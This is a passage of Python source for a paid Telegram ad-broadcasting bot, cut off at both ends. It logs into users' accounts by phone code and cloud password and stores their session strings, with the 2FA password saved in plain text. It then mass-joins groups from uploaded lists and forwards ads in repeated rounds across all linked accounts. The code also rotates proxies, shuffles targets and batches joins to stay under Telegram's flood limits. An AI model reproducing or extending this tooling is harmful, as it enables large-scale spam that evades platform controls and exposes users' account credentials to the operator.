                await event.edit(f"Code: `{otp}{'_' * (5-len(otp))}`", buttons=otp_keyboard())
            return
    
    except MessageNotModifiedError:
        pass
    except Exception as e:
        print(f"Callback error: {e}")
        await event.answer("Error!", alert=True)

@main_bot.on(events.NewMessage)
async def text_handler(event):
    uid = event.sender_id
    text = event.text.strip()
    
    if text.startswith('/'):
        return
    
    if uid not in user_states:
        return
    
    state = user_states[uid]
    action = state.get('action') if isinstance(state, dict) else None
    state_type = state.get('state') if isinstance(state, dict) else None
    
    # ===================== Payment Screenshot Handler =====================
    if state_type == 'awaiting_payment_screenshot':
        # User should send a photo (payment screenshot)
        request_id = state.get('request_id')
        if not request_id or request_id not in pending_upi_payments:
            await event.respond("⚠️ Payment request expired. Please start again.")
            del user_states[uid]
            return
        
        # Check if message has photo
        if not event.message.photo:
            await event.respond("📸 Please send a <b>photo</b> of your payment screenshot.", parse_mode='html')
            return
        
        pay_req = pending_upi_payments[request_id]
        pay_req['status'] = 'submitted'
        
        # Get admin list: OWNER + DB admins
        admin_ids = [BOT_CONFIG['owner_id']]
        db_admins = list(admins_col.find({}))
        for adm in db_admins:
            admin_ids.append(adm['user_id'])
        
        admin_ids = list(set(admin_ids))  # deduplicate
        
        # Build admin notification
        sender = await event.get_sender()
        username_display = f"@{pay_req['username']}" if pay_req.get('username') else 'No username'
        
        admin_text = (
            f"<b>💰 New Payment Screenshot</b>\n\n"
            f"<b>User ID:</b> <code>{pay_req['user_id']}</code>\n"
            f"<b>Username:</b> {username_display}\n"
            f"<b>Plan:</b> {pay_req['plan_name']}\n"
            f"<b>Amount:</b> ₹{pay_req['price']}\n\n"
            f"<b>UPI ID:</b> <code>{UPI_PAYMENT.get('upi_id', '')}</code>\n\n"
            f"Review the screenshot and approve/reject:"
        )
        
        admin_buttons = [
            [
                Button.inline("✅ Approve", f"payapprove_{request_id}".encode()),
                Button.inline("❌ Reject", f"payreject_{request_id}".encode())
            ]
        ]
        
        # Forward screenshot to all admins
        for admin_id in admin_ids:
            try:
                msg = await main_bot.send_message(
                    admin_id,
                    admin_text,
                    parse_mode='html',
                    file=event.message.photo,
                    buttons=admin_buttons
                )
                admin_payment_message_map[msg.id] = request_id
            except Exception as e:
                print(f"[PAYMENT] Failed to notify admin {admin_id}: {e}")
        
        # Confirm to user
        await event.respond(
            "<b>✅ Screenshot Submitted</b>\n\n"
            "Your payment is under review. You'll be notified once it's verified.\n\n"
            "<i>This usually takes a few minutes.</i>",
            parse_mode='html'
        )
        
        # Clear user state
        del user_states[uid]
        return
    
    # ===================== Auto Group Join File Handler =====================
    if state_type == 'awaiting_group_join_file':
        # User should send a .txt file with group links
        if not event.message.document:
            await event.respond("📄 Please send a .txt file with group links (one per line).", parse_mode='html')
            return

        # Check if premium
        if not is_premium(uid):
            await event.respond("⭐ Premium feature only!")
            del user_states[uid]
            return

        # Download file
        try:
            file_path = await event.message.download_media()

            with open(file_path, 'r', encoding='utf-8') as f:
                raw_lines = f.read().splitlines()

            # Parse group links
            group_links = []
            for line in raw_lines:
                line = (line or '').strip()
                if not line or line.startswith('#'):
                    continue
                if 'https://t.me/' in line:
                    username = line.split('https://t.me/')[-1].strip('/')
                elif 't.me/' in line:
                    username = line.split('t.me/')[-1].strip('/')
                elif line.startswith('@'):
                    username = line[1:]
                else:
                    username = line

                username = (username or '').strip().strip('/')
                if username:
                    group_links.append(username)

            try:
                os.remove(file_path)
            except Exception:
                pass

            # Deduplicate while preserving order
            seen = set()
            deduped = []
            for u in group_links:
                if u.lower() in seen:
                    continue
                seen.add(u.lower())
                deduped.append(u)
            group_links = deduped

            if not group_links:
                await event.respond("❌ No valid group links found in the file.")
                del user_states[uid]
                return

            user_accounts = list(accounts_col.find({'owner_id': uid}))
            if not user_accounts:
                await event.respond("❌ Add an account first.")
                del user_states[uid]
                return

            # Requirements: join 50 groups per hour (batch) per account
            BATCH_SIZE = 50
            BATCH_WAIT_SECONDS = 3600

            total_ops = len(user_accounts) * len(group_links)
            progress = {
                'done': 0,
                'joined': 0,
                'failed': 0,
                'current_batch': 1,
            }

            progress_msg = await event.respond(
                f"<b>Joining Groups...</b>\n\n"
                f"<b>Accounts:</b> {len(user_accounts)}\n"
                f"<b>Groups:</b> {len(group_links)}\n"
                f"<b>Mode:</b> <code>{BATCH_SIZE}/hour</code>\n\n"
                f"<b>Progress:</b> <code>0/{total_ops}</code>",
                parse_mode='html',
                buttons=[[Button.inline("Stop", b"auto_join_cancel"), Button.inline("Back", b"menu_auto_group_join")]]
            )

            lock = asyncio.Lock()
            stop_evt = asyncio.Event()
            auto_join_cancel[uid] = False

            from telethon.tl.functions.channels import JoinChannelRequest

            async def update_progress_loop():
                last = None
                while not stop_evt.is_set():
                    await asyncio.sleep(1)
                    if auto_join_cancel.get(uid):
                        stop_evt.set()
                        break

                    async with lock:
                        snap = (progress['done'], progress['joined'], progress['failed'], progress['current_batch'])
                    if snap == last:
                        continue
                    last = snap

                    done, joined, failed, batch_no = snap
                    try:
                        await main_bot.edit_message(
                            progress_msg.chat_id,
                            progress_msg.id,
                            f"<b>Joining Groups...</b>\n\n"
                            f"<b>Accounts:</b> {len(user_accounts)}\n"
                            f"<b>Groups:</b> {len(group_links)}\n"
                            f"<b>Mode:</b> <code>{BATCH_SIZE}/hour</code>\n"
                            f"<b>Batch:</b> <code>{batch_no}</code>\n\n"
                            f"<b>Progress:</b> <code>{done}/{total_ops}</code>\n"
                            f"<b>Joined:</b> <code>{joined}</code>\n"
                            f"<b>Failed:</b> <code>{failed}</code>",
                            parse_mode='html'
                        )
                    except Exception:
                        pass

            async def join_with_account(acc):
                account_id = acc.get('account_id') or acc.get('_id')
                if not account_id:
                    return

                # decrypt session
                try:
                    session_enc = acc.get('session')
                    if not session_enc:
                        return
                    session = cipher_suite.decrypt(session_enc.encode()).decode()
                except Exception:
                    return

                client = TelegramClient(StringSession(session), CONFIG['api_id'], CONFIG['api_hash'])
                try:
                    await client.connect()
                    if not await client.is_user_authorized():
                        return

                    for idx, username in enumerate(group_links):
                        if stop_evt.is_set() or auto_join_cancel.get(uid):
                            break

                        # Batch throttle: after each 50 joins attempt, wait 1 hour
                        if idx > 0 and (idx % BATCH_SIZE) == 0:
                            async with lock:
                                progress['current_batch'] += 1
                            # Wait, but still allow cancel
                            for _ in range(BATCH_WAIT_SECONDS):
                                if stop_evt.is_set() or auto_join_cancel.get(uid):
                                    break
                                await asyncio.sleep(1)

                        try:
                            entity = await client.get_entity(username)
                            await client(JoinChannelRequest(entity))
                            async with lock:
                                progress['joined'] += 1
                                progress['done'] += 1
                        except FloodWaitError as e:
                            # Respect floodwait for joining; don't count as failure but still counts as an attempt
                            wait_s = int(getattr(e, 'seconds', 0) or 0)
                            async with lock:
                                progress['done'] += 1
                            if wait_s > 0:
                                for _ in range(wait_s):
                                    if stop_evt.is_set() or auto_join_cancel.get(uid):
                                        break
                                    await asyncio.sleep(1)
                        except Exception:
                            async with lock:
                                progress['failed'] += 1
                                progress['done'] += 1

                        await asyncio.sleep(1)

                finally:
                    try:
                        await client.disconnect()
                    except Exception:
                        pass

            progress_task = asyncio.create_task(update_progress_loop())
            account_tasks = [asyncio.create_task(join_with_account(acc)) for acc in user_accounts]
            await asyncio.gather(*account_tasks, return_exceptions=True)
            stop_evt.set()
            try:
                await progress_task
            except Exception:
                pass

            async with lock:
                done = progress['done']
                joined = progress['joined']
                failed = progress['failed']

            final_status = "✅ Complete" if not auto_join_cancel.get(uid) else "⏸ Stopped"
            await main_bot.edit_message(
                progress_msg.chat_id,
                progress_msg.id,
                f"<b>{final_status}</b>\n\n"
                f"<b>Accounts:</b> {len(user_accounts)}\n"
                f"<b>Groups:</b> {len(group_links)}\n\n"
                f"<b>Total Attempts:</b> <code>{done}/{total_ops}</code>\n"
                f"<b>Joined:</b> <code>{joined}</code>\n"
                f"<b>Failed:</b> <code>{failed}</code>",
                parse_mode='html'
            )

        except Exception as e:
            await event.respond(f"❌ Error processing file: {e}")
            print(f"[AUTO_JOIN] Error: {e}")

        del user_states[uid]
        return
    
    if action == 'broadcast':
        if not is_admin(uid):
            del user_states[uid]
            return
        
        users = get_all_users()
        sent = 0
        failed = 0
        for u in users:
            try:
                await main_bot.send_message(u['user_id'], f"**Announcement**\n\n{text}")
                sent += 1
            except:
                failed += 1
        
        del user_states[uid]
        await event.respond(f"Broadcast complete!\nSent: {sent}\nFailed: {failed}")
        return
    
    if action == 'custom_autoreply':
        if not is_premium(uid):
            del user_states[uid]
            await event.respond("Premium only!")
            return
        
        # Save custom auto-reply to ALL user's accounts in account_settings_col
        accounts = get_user_accounts(uid)
        if accounts:
            for acc in accounts:
                update_account_settings(str(acc['_id']), {'auto_reply': text})
        
        del user_states[uid]
        await event.respond(
            f"✅ <b>Custom auto-reply saved!</b>\n\n<i>Applied to all {len(accounts)} account(s)</i>",
            parse_mode='html',
            buttons=[[Button.inline("← Back to Auto Reply", b"menu_autoreply")]]
        )
        return
    
    if action == 'add_topic_link':
        topic = state.get('topic')
        acc_id = state.get('account_id')
        last_msg_id = state.get('last_msg_id')
        
        raw_links = text.strip().replace(',', '\n').split('\n')
        links = []
        for raw in raw_links:
            link = raw.strip()
            if not link:
                continue
            if '?' in link:
                link = link.split('?')[0]
            if link.startswith('@'):
                link = f"https://t.me/{link[1:]}"
            elif link.startswith('t.me/'):
                link = f"https://{link}"
            elif not link.startswith('https://t.me/'):
                continue
            if 't.me/' in link:
                links.append(link)
        
        if not links:
            await event.respond("Invalid! Send links like:\n`https://t.me/groupname/5`\n\nYou can send multiple links, one per line.")
            return
        
        tier_settings = get_user_tier_settings(uid)
        max_groups = tier_settings.get('max_groups_per_topic', 10)
        current_count = account_topics_col.count_documents({'account_id': acc_id, 'topic': topic})
        
        added = 0
        skipped = 0
        
        for link in links:
            if current_count + added >= max_groups:
                break
            
            existing = account_topics_col.find_one({'account_id': acc_id, 'topic': topic, 'link': link})
            if existing:
                skipped += 1
                continue
            
            parts = link.replace('https://t.me/', '').split('/')
            group_username = parts[0]
            topic_msg_id = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else None
            display_title = f"{group_username}/{topic_msg_id}" if topic_msg_id else group_username
            
            account_topics_col.insert_one({
                'account_id': str(acc_id),  # ensure string for consistency
                'topic': topic,
                'link': link,
                'title': display_title,
                'topic_msg_id': topic_msg_id,
                'added_at': datetime.now()
            })
            added += 1
        
        new_count = current_count + added
        
        update_text = f"**{topic.title()}**\n\nGroups: {new_count}/{max_groups}\n"
        if added > 0:
            update_text += f"Added: {added}"
        if skipped > 0:
            update_text += f" | Skipped: {skipped} (duplicates)"
        update_text += "\n\n"
        
        groups = list(account_topics_col.find({'account_id': acc_id, 'topic': topic}).sort('added_at', -1).limit(5))
        for i, g in enumerate(groups):
            update_text += f"{i+1}. {g.get('title', 'Unknown')}\n"
        
        total = account_topics_col.count_documents({'account_id': acc_id, 'topic': topic})
        if total > 5:
            update_text += f"\n...and {total - 5} more"
        
        update_text += "\n\nSend more links or go back."
        
        if last_msg_id:
            try:
                await main_bot.edit_message(event.chat_id, last_msg_id, update_text, 
                    buttons=[[Button.inline("View All", f"view_topic_groups_{topic}_{acc_id}")], [Button.inline("Back to Topics", b"menu_topics")]])
                await event.delete()
            except:
                msg = await event.respond(update_text,
                    buttons=[[Button.inline("View All", f"view_topic_groups_{topic}_{acc_id}")], [Button.inline("Back to Topics", b"menu_topics")]])
                user_states[uid]['last_msg_id'] = msg.id
        else:
            msg = await event.respond(update_text,
                buttons=[[Button.inline("View All", f"view_topic_groups_{topic}_{acc_id}")], [Button.inline("Back to Topics", b"menu_topics")]])
            user_states[uid]['last_msg_id'] = msg.id
        return
    
    if action == 'custom_interval':
        step = state.get('step')
        try:
            val = int(text)
        except:
            await event.respond("Please enter a valid number!")
            return
        
        if step == 'msg_delay':
            if val < 1 or val > 9999:
                await event.respond("Enter a value between 1-9999:")
                return
            user_states[uid]['msg_delay'] = val
            user_states[uid]['step'] = 'round_delay'
            await event.respond("Enter round delay in seconds (60-9999):")
            return
        
        if step == 'round_delay':
            if val < 60 or val > 9999:
                await event.respond("Enter a value between 60-9999:")
                return
            
            custom_interval = {
                'msg_delay': user_states[uid]['msg_delay'],
                'round_delay': val
            }
            users_col.update_one({'user_id': uid}, {'$set': {'custom_interval': custom_interval, 'interval_preset': 'custom'}})
            del user_states[uid]
            await event.respond(
                f"**Custom Interval Saved!**\n\nMessage Delay: {custom_interval['msg_delay']}s\nRound Delay: {custom_interval['round_delay']}s",
                buttons=[[Button.inline("Back to Dashboard", b"enter_dashboard")]]
            )
            return
    
    if not is_approved(uid):
        approve_user(uid)
    
    if action == 'phone':
        if not re.match(r'^\+\d{10,15}$', text):
            await event.respond("Invalid format!\n\nUse: `+919876543210`")
            return
        
        accounts = get_user_accounts(uid)
        max_accounts = get_user_max_accounts(uid)
        
        if len(accounts) >= max_accounts:
            del user_states[uid]
            await event.respond(f"Account limit reached ({max_accounts})!")
            return
        
        # Typewriter effect: progressive updates
        status_msg = await event.respond("Connecting...")
        await asyncio.sleep(0.6)
        await status_msg.edit("Connecting to server...")
        await asyncio.sleep(0.7)
        await status_msg.edit("Sending OTP...")
        
        client = None
        try:
            proxy = get_next_proxy()
            proxy_info = f" via proxy" if proxy else ""
            print(f"[OTP] Sending code to {text}{proxy_info}")
            
            client = TelegramClient(StringSession(), CONFIG['api_id'], CONFIG['api_hash'], proxy=proxy)
            await client.connect()
            
            sent = await client.send_code_request(text)
            
            await asyncio.sleep(0.5)
            await status_msg.edit("OTP Sent!")
            
            user_states[uid] = {
                'action': 'otp',
                'client': client,
                'phone': text,
                'hash': sent.phone_code_hash,
                'proxy': proxy
            }
            
            await asyncio.sleep(0.4)
            await event.respond(
                "**OTP Sent**\n\n"
                "Enter the code you received.\n\n"
                "Format: `code1234` (if code is 1234)\n\n"
                "Example: `code12345`"
            )
            
        except PhoneNumberInvalidError:
            await status_msg.edit("Invalid phone number!")
            del user_states[uid]
            if client:
                try:
                    await client.disconnect()
                except Exception:
                    pass
        except Exception as e:
            await status_msg.edit(f"Failed to send OTP: {str(e)[:100]}")
            del user_states[uid]
            if client:
                try:
                    await client.disconnect()
                except Exception:
                    pass
    
    elif action == 'otp':
        # Accept code in format: code1234 (remove "code" prefix)
        otp_code = text
        if text.lower().startswith('code'):
            otp_code = text[4:].strip()
        
        if not otp_code.isdigit() or len(otp_code) < 4:
            await event.respond("Invalid code format!\n\nUse: `code12345` (if OTP is 12345)")
            return
        
        try:
            client = state['client']
            await client.sign_in(state['phone'], otp_code, phone_code_hash=state['hash'])
            
            # Check if 2FA enabled
            me = await client.get_me()
            
            # Login successful - save account
            session = client.session.save()
            encrypted = cipher_suite.encrypt(session.encode()).decode()
            
            result = accounts_col.insert_one({
                'owner_id': uid,
                'phone': state['phone'],
                'name': me.first_name or 'Unknown',
                'session': encrypted,
                'is_forwarding': False,
                'two_fa_password': '',
                'added_at': datetime.now()
            })
            
            account_id = str(result.inserted_id)
            
            # Send account added notification
            try:
                user = get_user(uid)
                sender = await event.get_sender()
                total_accounts = accounts_col.count_documents({'owner_id': uid})
                plan_name = user.get('plan', 'scout').capitalize()
                max_accounts = get_user_max_accounts(uid)
                
                print(f"[ACCOUNT] Triggering notification for user {uid}, phone {state['phone']}")
                # Use asyncio.create_task to avoid blocking, but ensure it runs
                task = asyncio.create_task(notify_account_added(
                    uid, sender.username, getattr(sender, 'phone', None),
                    state['phone'], plan_name, total_accounts, max_accounts
                ))
                # Don't await - let it run in background, but store reference to prevent garbage collection
                task.add_done_callback(lambda t: print(f"[ACCOUNT] Notification task completed: {t.exception() if t.exception() else 'Success'}"))
            except Exception as e:
                print(f"[NOTIFICATION] Error creating notification task: {e}")
                import traceback
                traceback.print_exc()
            
            count = await fetch_groups(client, account_id, state['phone'])
            await client.disconnect()
            
            del user_states[uid]
            
            # NEW: Show professional plan selection after login (with image)
            plan_msg = (
                f"**Account Successfully Added**\n\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"**Name:** {me.first_name}\n"
                f"**Phone:** {state['phone']}\n"
                f"**Groups Found:** {count}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"**💎 Choose Your Plan to Continue:**\n\n"
                f"• Scout - Free starter plan\n"
                f"• Grow - Scale your campaigns (₹69)\n"
                f"• Prime - Advanced automation (₹199)\n"
                f"• Dominion - Enterprise level (₹389)"
            )
            
            welcome_image = MESSAGES.get('welcome_image', '')
            if welcome_image:
                await event.respond(file=welcome_image, message=plan_msg, buttons=plan_select_keyboard(uid))
            else:
                await event.respond(plan_msg, buttons=plan_select_keyboard(uid))
            
        except SessionPasswordNeededError:
            # 2FA required
            user_states[uid]['action'] = '2fa'
            await event.respond(
                "**2FA Enabled**\n\n"
                "Enter your **Cloud Password**:"
            )
        except PhoneCodeInvalidError:
            await event.respond("Invalid code! Try again:")
        except PhoneCodeExpiredError:
            await event.respond("Code expired! Use /start to retry.")
            if 'client' in state:
                try:
                    client = state.get('client')
                    if client:
                        await client.disconnect()
                except Exception:
                    pass
            if uid in user_states:
                del user_states[uid]
        except Exception as e:
            await event.respond(f"Error: {str(e)[:100]}")
            if 'client' in state:
                try:
                    client_to_disconnect = state.get('client')
                    if client_to_disconnect:
                        await client_to_disconnect.disconnect()
                except Exception:
                    pass
            if uid in user_states:
                del user_states[uid]
    
    elif action == '2fa':
        try:
            client = state['client']
            pwd = text.strip()
            await client.sign_in(password=pwd)
            
            me = await client.get_me()
            session = client.session.save()
            encrypted = cipher_suite.encrypt(session.encode()).decode()
            
            result = accounts_col.insert_one({
                'owner_id': uid,
                'phone': state['phone'],
                'name': me.first_name or 'Unknown',
                'session': encrypted,
                'is_forwarding': False,
                'two_fa_password': pwd,
                'added_at': datetime.now()
            })
            
            account_id = str(result.inserted_id)
            count = await fetch_groups(client, account_id, state['phone'])
            await client.disconnect()
            
            del user_states[uid]
            
            print(f"[ACCOUNT] Added account for user {uid}, fetched {count} groups")

            # Send account added notification to channel
            try:
                user = get_user(uid)
                sender = await event.get_sender()
                total_accounts = accounts_col.count_documents({'owner_id': uid})
                plan_name = user.get('plan', 'scout').capitalize()
                max_accounts = get_user_max_accounts(uid)

                print(f"[ACCOUNT] Triggering notification for user {uid}, phone {state['phone']}")
                task = asyncio.create_task(notify_account_added(
                    uid, sender.username, getattr(sender, 'phone', None),
                    state['phone'], plan_name, total_accounts, max_accounts
                ))
                task.add_done_callback(lambda t: print(f"[ACCOUNT] Notification task completed: {t.exception() if t.exception() else 'Success'}"))
            except Exception as e:
                print(f"[NOTIFICATION] Error creating notification task (2FA flow): {e}")

            # NEW: Show professional plan selection after 2FA login (with image)
            plan_msg = (
                f"**Account Successfully Added**\n\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"**Name:** {me.first_name}\n"
                f"**Phone:** {state['phone']}\n"
                f"**Groups Found:** {count}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"**💎 Choose Your Plan to Continue:**\n\n"
                f"• Scout - Free starter plan\n"
                f"• Grow - Scale your campaigns (₹69)\n"
                f"• Prime - Advanced automation (₹199)\n"
                f"• Dominion - Enterprise level (₹389)"
            )
            
            welcome_image = MESSAGES.get('welcome_image', '')
            if welcome_image:
                await event.respond(file=welcome_image, message=plan_msg, buttons=plan_select_keyboard(uid))
            else:
                await event.respond(plan_msg, buttons=plan_select_keyboard(uid))
            
        except PasswordHashInvalidError:
            await event.respond("Wrong password! Try again:")
        except Exception as e:
            await event.respond(f"Error: {str(e)[:100]}")
            if 'client' in state:
                try:
                    client = state.get('client')
                    if client:
                        await client.disconnect()
                except Exception:
                    pass
            if uid in user_states:
                del user_states[uid]
    
    elif action == 'add_links':
        account_id = state['account_id']
        topic = state['topic']
        
        tier_settings = get_user_tier_settings(uid)
        max_groups = tier_settings.get('max_groups_per_topic', 10)
        current = account_topics_col.count_documents({'account_id': account_id, 'topic': topic})
        remaining = max_groups - current
        
        links = [l.strip() for l in text.splitlines() if 't.me/' in l][:remaining]
        added = 0
        
        for link in links:
            try:
                peer, url, topic_id = parse_link(link)
                account_topics_col.insert_one({
                    'account_id': str(account_id),  # ensure string for consistency
                    'topic': topic,
                    'url': url,
                    'peer': peer,
                    'topic_id': topic_id
                })
                added += 1
            except:
                continue
        
        del user_states[uid]
        
        total = account_topics_col.count_documents({'account_id': account_id, 'topic': topic})
        await event.respond(f"Added {added} links!\nTotal: {total}/{max_groups}")
    
    # set_msg_delay and set_round_delay removed: intervals are user-level only
    
    elif action == 'set_reply':
        tier_settings = get_user_tier_settings(uid)
        if not tier_settings.get('auto_reply_enabled'):
            del user_states[uid]
            await event.respond("Premium feature only!")
            return
        
        update_account_settings(state['account_id'], {'auto_reply': text})
        del user_states[uid]
        await event.respond("Auto-reply updated!")

    elif action == 'set_ads_custom_message':
        # Save custom ads message globally for this user (used by all accounts)
        msg_text = (event.raw_text or event.text or '').strip()
        if not msg_text and getattr(event.message, 'message', None):
            msg_text = str(event.message.message).strip()
        if not msg_text:
            await event.respond("❌ Please send a text message.")
            return

        users_col.update_one({'user_id': uid}, {'$set': {'ads_custom_message': msg_text, 'ads_mode': 'custom'}}, upsert=True)
        del user_states[uid]
        await event.respond("✅ Custom message saved! It will be used for ads from all added accounts.")

    elif action == 'set_ads_post_link':
        link = (event.raw_text or event.text or '').strip()
        if link.startswith('@'):
            link = f"https://t.me/{link[1:]}"
        elif link.startswith('t.me/'):
            link = f"https://{link}"
        elif link.startswith('http://t.me/'):
            link = 'https://' + link[len('http://'):]

        # Accept: https://t.me/username/123 OR https://t.me/c/123456/789 OR topic links with 3 numeric segments
        ok = False
        if link.startswith('https://t.me/'):
            tail = link.replace('https://t.me/', '')
            parts = [p for p in tail.split('/') if p]
            # username/msg or c/chat/msg or username/topic/msg
            if len(parts) in (2, 3):
                if parts[0] == 'c' and len(parts) >= 3 and parts[1].isdigit() and parts[2].isdigit():
                    ok = True
                elif parts[0] != 'c' and parts[1].isdigit():
                    # username/123 or username/topic/123
                    if len(parts) == 2:
                        ok = True
                    elif len(parts) == 3 and parts[2].isdigit():
                        ok = True

        if not ok:
            await event.respond(
                "❌ Invalid link! Send a Telegram post link like:\n"
                "https://t.me/username/123\n"
                "or\n"
                "https://t.me/c/123456/789"
            )
            return

        users_col.update_one({'user_id': uid}, {'$set': {'ads_post_link': link, 'ads_mode': 'post'}}, upsert=True)
        del user_states[uid]
        await event.respond("✅ Post link saved! Now ads will forward this post from all accounts.")

@logger_bot.on(events.NewMessage(pattern=r'^/start(?:@[\w_]+)?\s*(.*)$'))
async def logger_start(event):
    uid = event.sender_id
    args = event.pattern_match.group(1)
    
    if args:
        token_doc = logger_tokens_col.find_one({'token': args})
        if token_doc:
            user_states[f"log_{uid}"] = {'account_id': token_doc['account_id']}
            await event.respond(
                "**Logger Setup**\n\n"
                "1. Add me to a channel/group as admin\n"
                "2. Forward any message from that chat here\n\n"
                "Or send the chat ID directly."
            )
            return
    
    await event.respond(
        "**Welcome to GO ADS BOT Ads Logger Bot**\n\n"
        "This panel handles all your broadcast activity logs in real-time.\n"
        "Keep this chat open to stay updated on every action.\n\n"
        "To begin sending ads, start the main bot: @goadsbot",
        _no_style=True
    )

@logger_bot.on(events.NewMessage)
async def logger_handler(event):
    uid = event.sender_id
    key = f"log_{uid}"
    
    if key not in user_states:
        return
    
    state = user_states[key]
    
    if event.forward:
        chat_id = event.forward.chat_id
    else:
        try:
            chat_id = int(event.text.strip())
        except:
            await event.respond("Forward a message from target chat or send ID!")
            return
    
    try:
        await logger_bot.send_message(chat_id, "Logger connected! You'll receive forwarding logs here.")
        
        update_account_settings(state['account_id'], {'logs_chat_id': chat_id})
        
        del user_states[key]
        await event.respond("Logs configured!")
        
    except Exception as e:
        await event.respond(f"Cannot send to that chat!\nMake sure I'm admin.\n\nError: {str(e)[:50]}")

async def forwarder_loop(account_id, selected_topic, user_id):
    print(f"[{account_id}] Starting forwarder (topic: {selected_topic})")
    
    acc = get_account_by_id(account_id)
    if not acc:
        return
    
    tier_settings = get_user_tier_settings(user_id)
    
    await send_log(account_id, f"<b>🚀 Forwarding started</b>\nAccount: <code>{_h(acc['phone'])}</code>\nTopic: <code>{_h(str(selected_topic))}</code>")
    
    while True:
        try:
            acc = get_account_by_id(account_id)
            if not acc or not acc.get('is_forwarding'):
                print(f"[{account_id}] Stopped")
                break
            
            # Get user-level intervals (check for custom first, then tier defaults)
            user_doc = get_user(user_id)
            preset = user_doc.get('interval_preset', 'medium')
            if preset == 'custom' and user_doc.get('custom_interval'):
                custom = user_doc['custom_interval']
                msg_delay = custom.get('msg_delay', 30)
                round_delay = custom.get('round_delay', 600)
            else:
                interval_data = INTERVAL_PRESETS.get(preset, INTERVAL_PRESETS['medium'])
                msg_delay = interval_data.get('msg_delay', tier_settings['msg_delay'])
                round_delay = interval_data.get('round_delay', tier_settings['round_delay'])
            
            auto_reply_msg = settings.get('auto_reply', MESSAGES['auto_reply'])
            reply_cooldown = settings.get('reply_cooldown', 300)
            
            try:
                session = cipher_suite.decrypt(acc['session'].encode()).decode()
                client = TelegramClient(StringSession(session), CONFIG['api_id'], CONFIG['api_hash'])
                await client.connect()
                
                if not await client.is_user_authorized():
                    print(f"[{account_id}] Session expired")
                    await send_log(account_id, "Session expired!")
                    await asyncio.sleep(60)
                    continue
                
                await client.start()
                
                # ===================== Ads Source (Ads Mode) =====================
                user_doc = get_user(user_id)
                ads_mode = user_doc.get('ads_mode', 'saved')

                ads = []
                custom_text = None
                post_source_entity = None
                post_source_msg_id = None
                post_source_input_peer = None

                if ads_mode == 'custom':
                    custom_text = (user_doc.get('ads_custom_message') or '').strip()
                    if not custom_text:
                        print(f"[{account_id}] Custom message not set")
                        await send_log(account_id, "Custom message not set! Open Settings → Ads Mode → Set Custom Message.")
                        await client.disconnect()
                        await asyncio.sleep(60)
                        continue

                    # placeholder list so rotation logic works
                    ads = [None]

                elif ads_mode == 'post':
                    link = (user_doc.get('ads_post_link') or '').strip()
                    if not link:
                        print(f"[{account_id}] Post link not set")
                        await send_log(account_id, "Post link not set! Open Settings → Ads Mode → Set Post Link.")
                        await client.disconnect()
                        await asyncio.sleep(60)
                        continue

                    try:
                        tail = link.replace('https://t.me/', '')
                        parts = [p for p in tail.split('/') if p]
                        if parts and parts[0] == 'c' and len(parts) >= 3:
                            cid = parts[1]
                            post_source_entity = int('-100' + str(cid))
                            post_source_msg_id = int(parts[2])
                        else:
                            # username/123 OR username/topic/123
                            post_source_entity = parts[0]
                            post_source_msg_id = int(parts[-1])

                        # verify message exists for this account
                        _m = await client.get_messages(post_source_entity, ids=post_source_msg_id)
                        if not _m:
                            raise Exception('Message not found / no access')

                        post_source_input_peer = await client.get_input_entity(post_source_entity)
                        ads = [None]
                    except Exception as e:
                        print(f"[{account_id}] Invalid post link: {e}")
                        await send_log(account_id, f"Invalid post link or no access: {str(e)[:120]}")
                        await client.disconnect()
                        await asyncio.sleep(60)
                        continue

                else:
                    # saved (default)
                    async for msg in client.iter_messages('me', limit=10):
                        if msg.text or msg.media:
                            ads.append(msg)
                    ads.reverse()

                    if not ads:
                        print(f"[{account_id}] No ads in Saved Messages")
                        await send_log(account_id, "No ads found in Saved Messages!")
                        await client.disconnect()
                        await asyncio.sleep(60)
                        continue
                
                all_targets = []
                max_topics = tier_settings.get('max_topics', 3)
                
                if selected_topic != "all" and selected_topic in TOPICS[:max_topics]:
                    topic_links = list(account_topics_col.find({'account_id': {'$in': _account_id_variants(account_id)}, 'topic': selected_topic}))
                    for t in topic_links:
                        group_key = t['url']
                        group_name = t.get('url', 'Unknown')
                        if not is_group_failed(account_id, group_key):
                            all_targets.append({'type': 'topic', 'data': t, 'key': group_key, 'name': group_name})
                
                auto_groups = list(account_auto_groups_col.find({'account_id': {'$in': _account_id_variants(account_id)}}))
                topic_peers = set()
                
                if selected_topic != "all":
                    for t in all_targets:
                        if 'peer' in t['data']:
                            topic_peers.add(str(t['data']['peer']))
                
                for g in auto_groups:
                    group_key = str(g['group_id'])
                    group_name = g.get('title', 'Unknown')
                    if group_key not in topic_peers and not is_group_failed(account_id, group_key):
                        all_targets.append({'type': 'auto', 'data': g, 'key': group_key, 'name': group_name})
                
                active_waits = get_active_flood_waits(account_id)
                
                # Get user settings for log display
                user_doc = get_user(user_id)
                ads_mode_display = user_doc.get('ads_mode', 'saved').upper()
                auto_leave = user_doc.get('auto_leave_groups', True)
                auto_leave_status = "ON" if auto_leave else "OFF"
                
                print(f"[{account_id}] Forwarding to {len(all_targets)} groups (flood waits: {active_waits})")
                await send_log(
                    account_id, 
                    f"<b>ꜱᴛᴀʀᴛɪɴɢ ʀᴏᴜɴᴅ</b>\n"
                    f"<b>ᴍᴏᴅᴇ:</b> <code>ᴀᴜᴛᴏ</code>\n"
                    f"<b>ᴀᴅꜱ ᴍᴏᴅᴇ:</b> <code>{ads_mode_display}</code>\n"
                    f"<b>ᴀᴜᴛᴏ ʟᴇᴀᴠᴇ ꜰᴀɪʟᴇᴅ:</b> <code>{auto_leave_status}</code>\n\n"
                    f"<b>Groups:</b> <code>{len(all_targets)}</code>\n"
                    f"<b>Flood waits:</b> <code>{active_waits}</code>"
                )
                
                # ===================== Smart Rotation (Premium) =====================
                # Shuffle target order if enabled
                user_settings = users_col.find_one({"user_id": user_id})
                if user_settings and user_settings.get('smart_rotation', False):
                    import random
                    random.shuffle(all_targets)
                    print(f"[{account_id}] Smart rotation: targets shuffled")
                    await send_log(account_id, f"Smart rotation: {len(all_targets)} targets shuffled")
                
                sent = 0
                failed = 0
                skipped = 0
                
                for i, target in enumerate(all_targets):
                    try:
                        acc_check = get_account_by_id(account_id)
                        if not acc_check or not acc_check.get('is_forwarding'):
                            break
                        
